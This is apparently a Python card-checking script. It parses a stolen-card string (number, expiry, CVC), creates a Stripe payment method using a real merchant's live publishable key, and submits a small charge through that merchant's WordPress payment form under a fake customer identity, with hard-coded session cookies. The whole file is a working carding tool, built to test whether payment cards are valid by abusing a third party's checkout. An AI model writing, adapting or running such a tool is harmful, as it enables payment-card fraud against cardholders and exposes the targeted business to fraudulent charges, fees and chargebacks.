import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F6998fecf74%3B+stripe-js-v3%2F6998fecf74%3B+card-element&key=pk_live_51QOSGsBSdD240uQEHRbI1Uoe2VKOKidFPq0TQfyr1SPXwD7CyZkMDsO4t7M0IzB584DJlx4ze75fYe96AYJxxu4S00rEgTnmeR'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_ga': 'GA1.1.1597466595.1740096794',
	    '__stripe_mid': 'fa860ab2-0e78-4a8e-b532-26acdba570ab427469',
	    '__stripe_sid': '163d3db2-5634-43db-9d7e-1f93b4020a1b6c5307',
	    '_ga_WCQ2FKT7F4': 'GS1.1.1740096793.1.1.1740096896.0.0.0',
	}
	
	headers = {
	    'authority': 'tucsonmarketingdirect.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.1597466595.1740096794; __stripe_mid=fa860ab2-0e78-4a8e-b532-26acdba570ab427469; __stripe_sid=163d3db2-5634-43db-9d7e-1f93b4020a1b6c5307; _ga_WCQ2FKT7F4=GS1.1.1740096793.1.1.1740096896.0.0.0',
	    'origin': 'https://tucsonmarketingdirect.com',
	    'referer': 'https://tucsonmarketingdirect.com/make-a-payment/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wpf_submit_form',
	    'form_id': '1763',
	    'payment_total': '100',
	    'form_data': '__wpf_form_id=1763&__wpf_current_url=https%3A%2F%2Ftucsonmarketingdirect.com%2Fmake-a-payment&__wpf_current_page_id=1688&customer_name_1=Rodam%20User&customer_email_1=rodamuser20%40gmail.com&address_input%5Baddress_line_1%5D=Street%2027&address_input%5Baddress_line_2%5D=&address_input%5Bcity%5D=New%20York&address_input%5Bstate%5D=New%20York&address_input%5Bzip_code%5D=10080&address_input%5Bcountry%5D=US&custom_payment_input=1&__stripe_payment_method_id='+str(pm)+'',
	    'tax_total': '0',
	    'main_total': '100',
	}
	
	r2 = requests.post('https://tucsonmarketingdirect.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
